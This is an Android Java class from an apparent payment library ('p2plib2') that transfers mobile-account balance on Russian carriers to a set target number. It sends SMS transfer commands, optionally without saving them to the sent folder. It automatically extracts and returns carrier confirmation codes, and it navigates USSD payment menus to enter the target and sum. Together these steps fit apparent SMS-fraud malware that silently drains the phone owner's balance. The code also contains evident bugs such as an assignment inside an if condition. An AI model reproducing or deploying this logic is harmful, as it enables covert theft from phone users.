package  com.p2plib2.operators;



import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;


import com.p2plib2.Logger;
import com.p2plib2.PayLib;
import com.p2plib2.ussd.USSDController;

import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;

import static com.p2plib2.PayLib.flagok;

public class Operator {
    /**
     * operator info
     */
    public String name;
    public String smsNum;
    protected String ussdNum;
    public String target;
    protected String sum;
    /**
     * Additional settings
     */
    private Boolean sendWithSaveOutput;
    private Boolean sendWithSaveInput;
    private Context cnt;
    static HashMap mapUssd = new HashMap<>();

    public Operator(String operName, Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Context cnt) {
        this.name = operName;
        this.cnt = cnt;
        this.sendWithSaveOutput = sendWithSaveOutput;
        this.sendWithSaveInput = sendWithSaveInput;
    }


    public void sendSMS(Context cnt) {
        String msgBody = createMsgBody();
        String number = getOperNum();
        SmsManager smsManager = SmsManager.getDefault();
        try {
            Logger.lg(name + " num " + number + " " + sendWithSaveInput + " " + msgBody);
            if (sendWithSaveOutput) {
                smsManager.sendTextMessage(number, null, msgBody, null, null);
            } else {
                smsManager.sendTextMessageWithoutPersisting(number, null, msgBody, null, null);

            }
        } catch (Exception e) {
            Logger.lg("Something wrong! " + e.getMessage());
        }
    }

    private String getOperNum() {
        String operNum = "";
        switch (name) {
            case "MTS":
                operNum = "+7" + target;
                break;
            case "BEELINE":
                operNum = smsNum;
                break;
            case "MEGAFON":
                operNum = "+7" + target;
                break;
        }
        return operNum;
    }

    private String createMsgBody() {
        String msgBody = "";
        switch (name) {
            case "MTS":
                msgBody = "#перевод " + sum;
                break;
            case "BEELINE":
                msgBody = "7" + target + " " + sum;
                break;
            case "MEGAFON":
                msgBody = sum + " перевод";
                break;
        }
        return msgBody;
    }

    public void sendAnswer(String smsBody, String smsSender) {
        String sms_body = smsBody.toLowerCase();
        Logger.lg("sendAnswer " + sms_body);
        if (sms_body.contains("отправьте") || sms_body.contains("ответьте")|| sms_body.contains("подтвердите")) {
            SmsManager smsManager = SmsManager.getDefault();
            String answ = "";
            PendingIntent sentPI = PendingIntent.getBroadcast(cnt, 0, new Intent(
                    "SMS_SENT"), 0);
            if (sms_body.toLowerCase().contains("подтвердите")) {
                answ = sms_body.substring(sms_body.indexOf("кодом ") + 6, sms_body.indexOf(" в ответном") + 1);
            } else {
                answ = "1";
            }
            if (sms_body.contains("ответьте") || sms_body.contains("на номер")) {
                smsNum = sms_body.substring(sms_body.indexOf("на номер") + 8).replaceAll("[^0-9]", "");
            } else if(sms_body.contains("ответном")){
                smsNum = smsSender;
            }
            Logger.lg("Answer  " + answ + " smsNum " + smsNum);
            if (sendWithSaveOutput) {
                smsManager.sendTextMessage(smsNum, null, answ, sentPI, null);
            } else {
                smsManager.sendTextMessageWithoutPersisting(smsNum, null, answ, sentPI, null);
            }
//            try {
//                PayLib.feedback.callResult(sentPI.toString());
//            } catch (Exception ex){
//                Logger.lg("Feedback is empty! " + ex.getMessage());
//            }
        } else {
            Logger.lg("Error! " + sms_body);
            PayLib.getSMSResult(sms_body);
        }

    }


    public void sendUssd(final String destOper, Activity act) {
        Logger.lg("Flagok " + flagok);
        if (flagok = true) {
            final USSDController ussdController = USSDController.getInstance(act);
            ussdController.cleanCallbackMessage();
            mapUssd.put("KEY_LOGIN", new HashSet<>(Arrays.asList("подождите", "загрузка")));
            mapUssd.put("KEY_ERROR", new HashSet<>(Arrays.asList("problema", "problem", "ошибка", "null")));
            //*145*9031234567*150#
            String str = "";
            switch (name) {
                case "MTS":
                    ussdController.callUSSDInvoke(ussdNum, mapUssd, new USSDController.CallbackInvoke() {
                        @Override
                        public void responseInvoke(String message) {
                            //   Logger.lg("Case 1 " + message);
                            if (message.contains("1>Мобильный телефон")) {
                                Logger.lg(message);
                                ussdController.send("1", new USSDController.CallbackMessage() {
                                    @Override
                                    public void responseMessage(String message) {
                                        if (message.contains("1>Оплатить МТС") && destOper == "MTS") {
                                            Logger.lg(message);
                                            ussdController.send("1", new USSDController.CallbackMessage() {
                                                @Override
                                                public void responseMessage(String message) {
                                                }
                                            });
                                        }
                                        if (destOper == "Beeline") {
                                            ussdController.send("2", new USSDController.CallbackMessage() {
                                                @Override
                                                public void responseMessage(String message) {

                                                }
                                            });
                                        }
                                        if (destOper == "Megafon") {
                                            ussdController.send("3", new USSDController.CallbackMessage() {
                                                @Override
                                                public void responseMessage(String message) {

                                                }
                                            });
                                        }
                                        if (destOper == "Tele2") {
                                            ussdController.send("4", new USSDController.CallbackMessage() {
                                                @Override
                                                public void responseMessage(String message) {

                                                }
                                            });
                                        }
                                    }
                                });
                            }
                            if (destOper == "MTS") {
                                if (message.contains("2>Другой номер МТС")) {
                                    Logger.lg(message);
                                    ussdController.send("2", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("Номер телефона")) {
                                                Logger.lg(message);
                                                ussdController.send(target, new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {

                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                                if (message.contains("Сумма платежа")) {
                                    Logger.lg(message);
                                    ussdController.send(sum, new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("счет МТС")) {
                                                Logger.lg(message);
                                                ussdController.send("1", new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {

                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                                if (message.contains("счет МТС")) {
                                    Logger.lg(message);
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {

                                        }
                                    });
                                }
                                if (message.contains("Сумма к оплате")) {
                                    Logger.lg(message);
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                        }
                                    });
                                }

                            }
                            if (destOper == "Beeline") {
                                if (message.contains("Номер телефона")) {
                                    Logger.lg(message);
                                    ussdController.send(target, new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("Сумма платежа")) {
                                                Logger.lg(message);
                                                ussdController.send(sum, new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                                if (message.contains("счет МТС")) {
                                    Logger.lg(message);
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("Комиссия") || message.contains("Сумма к оплате")) {
                                                Logger.lg(message);
                                                ussdController.send("1", new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                            }
                            if (destOper == "Megafon") {
                                if (message.contains("Номер телефона")) {
                                    Logger.lg(message);
                                    ussdController.send(target, new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("Сумма платежа")) {
                                                Logger.lg(message);
                                                ussdController.send(sum, new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                                if (message.contains("счет МТС")) {
                                    Logger.lg(message);
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("Сумма к")) {
                                                Logger.lg(message);
                                                ussdController.send("1", new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                            }
                            if (destOper == "Tele2") {
                                if (message.toLowerCase().contains("tele2")) {
                                    Logger.lg(message);
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("Номер телефона")) {
                                                Logger.lg(message);
                                                ussdController.send(target, new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                                if (message.contains("Сумма") && !message.contains("Комиссия")) {
                                    Logger.lg(message);
                                    ussdController.send(sum, new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {
                                            if (message.contains("счет МТС")) {
                                                Logger.lg(message);
                                                ussdController.send("1", new USSDController.CallbackMessage() {
                                                    @Override
                                                    public void responseMessage(String message) {
                                                    }
                                                });
                                            }
                                        }
                                    });
                                }
                                if (message.contains("Комиссия")) {
                                    Logger.lg(message);
                                    ussdController.send("1", new USSDController.CallbackMessage() {
                                        @Override
                                        public void responseMessage(String message) {

                                        }
                                    });
                                }
                            }
                        }

                        @Override
                        public void over(String message) {
                            PayLib.flagok = false;
                            PayLib.feedback.callResult(message);
                            // message has the response string data from USSD
                            // response no have input text, NOT SEND ANY DATA
                        }
                    });
                    break;
                case "BEELINE":
                    str = ussdNum + target + "*" + sum + "#";
                    ussdController.callUSSDInvoke(str, mapUssd, new USSDController.CallbackInvoke() {
                        @Override
                        public void responseInvoke(String message) {
                            // first option list - select option 1
                            String answ = message.substring(message.indexOf("введите ") + 8, message.indexOf("."));
                            Logger.lg(message);
                            ussdController.send(answ, new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                }
                            });
                        }

                        @Override
                        public void over(String message) {
                            PayLib.flagok = false;
                            PayLib.feedback.callResult(message);
                            // message has the response string data from USSD
                            // response no have input text, NOT SEND ANY DATA
                        }
                    });
                    break;
                case "MEGAFON":
                    str = ussdNum + sum + "*" + target + "#";
                    Logger.lg("Megafon ussd " + str);
                    ussdController.callUSSDInvoke(str, mapUssd, new USSDController.CallbackInvoke() {
                        @Override
                        public void responseInvoke(String message) {
                            // first option list - select option 1
                        }

                        @Override
                        public void over(String message) {
                            PayLib.flagok = false;
                            PayLib.feedback.callResult(message);
                            // message has the response string data from USSD
                            // response no have input text, NOT SEND ANY DATA
                        }
                    });
                    break;
                case "TELE":
                    str = ussdNum + target + "*" + sum + "#";
                    ussdController.callUSSDInvoke(str, mapUssd, new USSDController.CallbackInvoke() {
                        @Override
                        public void responseInvoke(String message) {
                            // first option list - select option 1
                            Logger.lg(message);
                            ussdController.send("1", new USSDController.CallbackMessage() {
                                @Override
                                public void responseMessage(String message) {
                                }
                            });
                        }

                        @Override
                        public void over(String message) {
                            PayLib.flagok = false;
                            PayLib.feedback.callResult(message);
                            // message has the response string data from USSD
                            // response no have input text, NOT SEND ANY DATA
                        }
                    });
                    break;
            }
        }
    }

    public void setData(String sms_number, String target, String sum, String ussd) {
        this.smsNum = sms_number;
        this.target = target;
        this.sum = sum;
        this.ussdNum = ussd;
    }

    @Override
    public String toString() {
        return name +
                " smsNum " + smsNum +
                " ussdNum " + ussdNum +
                " target " + target +
                " sum " + sum;
    }

}
